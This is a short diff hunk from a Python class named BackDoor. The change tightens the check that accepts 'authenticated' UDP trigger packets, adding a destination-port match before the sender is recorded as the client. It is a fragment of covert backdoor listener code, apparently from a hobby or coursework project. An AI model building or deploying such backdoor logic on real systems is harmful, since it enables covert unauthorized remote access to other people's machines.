@@ -78,7 +78,7 @@ class BackDoor:
         try:
             msg = packet[UDP].load.decode()
             if UDP in packet and msg.startswith(self.flag_begin) \
-                    and msg.endswith(self.flag_close):
+                    and msg.endswith(self.flag_close) and packet[UDP].dport == self.port:
                 print(f"Received authenticated packet: {msg}")
                 if not self.client:
                     self.set_client(packet[IP].src)
